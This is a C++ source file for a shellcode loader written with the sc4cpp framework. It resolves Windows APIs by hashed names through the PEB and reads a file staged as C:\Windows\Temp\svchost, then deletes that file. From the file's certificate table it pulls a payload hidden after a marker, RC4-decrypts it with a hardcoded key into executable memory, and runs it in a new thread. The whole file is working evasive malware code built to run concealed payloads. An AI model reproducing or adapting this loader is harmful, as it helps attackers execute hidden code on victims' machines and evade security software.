#include "sc4cpp.h"
#include <WinTrust.h>


SC_CODESEG_REORDERING SC_FORCEINLINE PPEB GetPEB_t() {
#ifdef _WIN64
	return (PPEB)__readgsqword(offsetof(TEB, ProcessEnvironmentBlock));
#else
	return (PPEB)__readfsdword(offsetof(TEB, ProcessEnvironmentBlock));
#endif  // _WIN64
}


SC_CODESEG_REORDERING SC_FORCEINLINE PLDR_DATA_TABLE_ENTRY GetDataTableEntry_t(PLIST_ENTRY lpList) {
	SIZE_T zuEntryOffset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return (PLDR_DATA_TABLE_ENTRY)((LPBYTE)lpList - zuEntryOffset);
}


SC_CODESEG_REORDERING SC_FORCEINLINE PIMAGE_NT_HEADERS GetNTHeaders_t(PVOID lpDLLBase) {
	PIMAGE_DOS_HEADER lpDOSHeader = (PIMAGE_DOS_HEADER)lpDLLBase;
	return (PIMAGE_NT_HEADERS)((PBYTE)lpDLLBase + lpDOSHeader->e_lfanew);
}

template <typename Converter_t>
SC_CODESEG_REORDERING SC_FORCEINLINE SC_CONSTEXPR DWORD Hash_t(PCSTR lpName) {
	DWORD dwHash = 2166136261u;
	for (; *lpName != '\0'; ++lpName) {
		dwHash = (dwHash ^ (BYTE)Converter_t()(*lpName)) * 16777619ull;
	}
	return dwHash;
}

SC_CODESEG_REORDERING SC_FORCEINLINE SC_CONSTEXPR DWORD Hash_t(PCSTR lpName) {
	struct Converter_t {
		SC_CONSTEXPR Converter_t() {}
		SC_CONSTEXPR CHAR operator()(CHAR c) const { return c; }
	};
	return Hash_t<Converter_t>(lpName);
}

SC_CODESEG_REORDERING SC_FORCEINLINE SC_CONSTEXPR DWORD HashI_t(PCSTR lpName) {
	struct Converter_t {
		SC_CONSTEXPR Converter_t() {}
		SC_CONSTEXPR CHAR operator()(CHAR c) const {
			return c >= 'A' && c <= 'Z' ? c + ('a' - 'A') : c;
		}
	};
	return Hash_t<Converter_t>(lpName);
}

SC_CODESEG_REORDERING SC_NOINLINE LPSTR GetModuleHandleByHash_t(DWORD dwDLLHash) {
	PLIST_ENTRY lpSentryNode = &GetPEB_t()->Ldr->InMemoryOrderModuleList;
	for (PLIST_ENTRY lpIterNode = lpSentryNode->Flink;
		lpIterNode != lpSentryNode;
		lpIterNode = lpIterNode->Flink) {
		PLDR_DATA_TABLE_ENTRY lpDLLEntry = GetDataTableEntry_t(lpIterNode);
		LPSTR lpDLLBase = (LPSTR)lpDLLEntry->DllBase;
		if (lpDLLBase == NULL) {
			continue;
		}
		PIMAGE_NT_HEADERS lpNTHeaders = GetNTHeaders_t(lpDLLBase);
		DWORD dwExportDirectoryRAV =
			lpNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (dwExportDirectoryRAV == 0) {
			continue;
		}
		PIMAGE_EXPORT_DIRECTORY lpExportDirectory =
			(PIMAGE_EXPORT_DIRECTORY)(lpDLLBase + dwExportDirectoryRAV);
		if (HashI_t(lpDLLBase + lpExportDirectory->Name) == dwDLLHash) {
			return (LPSTR)lpDLLBase;
		}
	}
	return nullptr;
}

SC_CODESEG_REORDERING SC_NOINLINE PVOID GetProcAddressByHashA_t(LPSTR lpDLLBase, DWORD dwProcHash) {
	PIMAGE_NT_HEADERS lpNTHeaders = GetNTHeaders_t(lpDLLBase);
	DWORD dwExportDirectoryRAV =
		lpNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (dwExportDirectoryRAV == 0) {
		return nullptr;
	}
	PIMAGE_EXPORT_DIRECTORY lpExportDirectory =
		(PIMAGE_EXPORT_DIRECTORY)(lpDLLBase + dwExportDirectoryRAV);
	PDWORD lpNameRAVs = (PDWORD)(lpDLLBase + lpExportDirectory->AddressOfNames);
	PWORD lpOrdinals = (PWORD)(lpDLLBase + lpExportDirectory->AddressOfNameOrdinals);
	PDWORD lpProcRAVs = (PDWORD)(lpDLLBase + lpExportDirectory->AddressOfFunctions);
	for (DWORD dwIdx = 0; dwIdx < lpExportDirectory->NumberOfNames; ++dwIdx) {
		if (Hash_t(lpDLLBase + lpNameRAVs[dwIdx]) == dwProcHash) {
			// FIXME: DLL Function Forwarding
			return lpDLLBase + lpProcRAVs[lpOrdinals[dwIdx]];
		}
	}
	return nullptr;
}

SC_CODESEG_REORDERING SC_NOINLINE void decrypt(unsigned char* data, long dataLen, unsigned char* key, long keyLen, unsigned char* result) {
	unsigned char T[256];
	unsigned char S[256];
	unsigned char  tmp;
	int j = 0, t = 0, i = 0;


	for (int i = 0; i < 256; i++) {
		S[i] = i;
		T[i] = key[i % keyLen];
	}

	for (int i = 0; i < 256; i++) {
		j = (j + S[i] + T[i]) % 256;
		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;
	}
	j = 0;
	for (int x = 0; x < dataLen; x++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;

		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;

		t = (S[i] + S[j]) % 256;

		result[x] = data[x] ^ S[t];
	}
}

#define Np_memcpy(dst, src, size) __movsb( ( BYTE* ) dst, ( const BYTE* ) src, size )

// clang-format off
SC_MAIN_BEGIN()
{
	// clang-format on
	SC_IMPORT_API_BATCH_BEGIN();
	SC_IMPORT_API_BATCH("kernel32.dll", ReadFile);
	SC_IMPORT_API_BATCH("kernel32.dll", IsWow64Process);
	SC_IMPORT_API_BATCH("kernel32.dll", GetCurrentProcess);
	SC_IMPORT_API_BATCH("kernel32.dll", VirtualAlloc);
	//SC_IMPORT_API_BATCH("kernel32.dll", WriteProcessMemory);
	SC_IMPORT_API_BATCH("kernel32.dll", CreateThread);
	SC_IMPORT_API_BATCH("kernel32.dll", WaitForSingleObject);
	SC_IMPORT_API_BATCH("kernel32.dll", CreateFileA);
	SC_IMPORT_API_BATCH("kernel32.dll", GetFileSize);
	SC_IMPORT_API_BATCH("kernel32.dll", DeleteFileW);
	SC_IMPORT_API_BATCH("kernel32.dll", VirtualFree);
	SC_IMPORT_API_BATCH("kernel32.dll", CloseHandle);
	SC_IMPORT_API_BATCH_END();

	auto _fHandle = CreateFileA(SC_PISTRINGA("C:\\Windows\\Temp\\svchost"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}
	auto _fSize = GetFileSize(_fHandle, NULL);

	auto base = (char*)VirtualAlloc(NULL, _fSize, MEM_COMMIT, PAGE_READWRITE);
	DWORD _bytesRead = 0;
	ReadFile(_fHandle, base, _fSize, &_bytesRead, NULL);
	CloseHandle(_fHandle);
	DeleteFileW(SC_PISTRINGW(L"\\\\?\\C:\\Windows\\Temp\\svchost"));

	auto _dosHeader = (PIMAGE_DOS_HEADER)base;
	auto _ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)base + _dosHeader->e_lfanew);


	BOOL isWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &isWow64);
	DWORD _DT_SecEntry_Offset = 0;
	DWORD _dataOffset = 0;


	if (isWow64) {
		if (_ntHeader->OptionalHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_ntHeader->OptionalHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	auto _CertTableRVA = _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	auto _CertTableSize = _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	//auto _wCert = (LPWIN_CERTIFICATE)((BYTE*)base + _CertTableRVA);

	auto _pePtr = ((BYTE*)base + _CertTableRVA);
	for (SIZE_T _index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xfe && *(_pePtr + _index + 1) == 0xed && *(_pePtr + _index + 2) == 0xfa && *(_pePtr + _index + 3) == 0xce) {
			_dataOffset = _index + 8;
			break;
		}
	}

	//if (_dataOffset != _index + 8) {
	//	return;
	//}

	auto _encryptedDataSize = _CertTableSize - _dataOffset;
	auto _decryptedData = (CHAR*)VirtualAlloc(NULL, _encryptedDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	Np_memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);

	decrypt((unsigned char*)_decryptedData, _encryptedDataSize, (unsigned char*)SC_PISTRINGA("56264636"), 8, (unsigned char*)_decryptedData);

	if (base)
	{
		VirtualFree(base, _fSize, MEM_RELEASE);
		base = nullptr;
	}

	//auto shellcode = VirtualAlloc(NULL, _encryptedDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//WriteProcessMemory(GetCurrentProcess(), shellcode, _decryptedData, _encryptedDataSize, NULL);
	auto HThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_decryptedData, 0, 0, 0);
	WaitForSingleObject(HThread, 0xFFFFFFFF);



	//if (_decryptedData)
	//{
	//	VirtualFree(_decryptedData, _encryptedDataSize, MEM_RELEASE);
	//	_decryptedData = nullptr;
	//}
	//if (HThread)
	//{
	//	CloseHandle(HThread);
	//}
	// clang-format off
}
SC_MAIN_END()
// clang-format on